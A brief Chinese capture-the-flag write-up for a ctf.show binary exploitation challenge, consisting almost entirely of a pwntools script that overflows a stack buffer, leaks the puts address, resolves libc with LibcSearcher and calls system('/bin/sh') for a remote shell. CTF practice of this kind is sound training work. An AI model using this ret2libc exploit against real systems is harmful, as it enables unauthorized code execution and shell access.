# 挑战简介
没有write了，试试用puts吧，更简单了呢

# 思路
虽然本来就是用puts的，上一题脚本过了

```
#!/usr/bin/python3
from pwn import *
from LibcSearcher import *

context.log_level = "debug"

p= remote("pwn.challenge.ctf.show",28207)
elf = ELF('./pwn')


offset = b'a'*(0x6B + 0x4)

sh_addr = 0x804B028

vuln = elf.symbols['ctfshow']

puts_plt = elf.plt['puts']

puts_got = elf.got['puts']
 

payload = offset + p32(puts_plt) + p32(vuln) + p32(puts_got)

p.sendline(payload)

puts_real = u32(p.recvuntil(b'\xf7')[-4:])
print(hex(puts_real))

libc = LibcSearcher('puts',puts_real)
libc_base = puts_real - libc.dump('puts')
print(hex(libc_base))

bin_sh = libc_base + libc.dump('str_bin_sh')
system = libc_base + libc.dump('system')

payload = offset + p32(system) + p32(0xdeadbeef) + p32(bin_sh)

print(payload)

p.sendline(payload)

p.interactive()

```
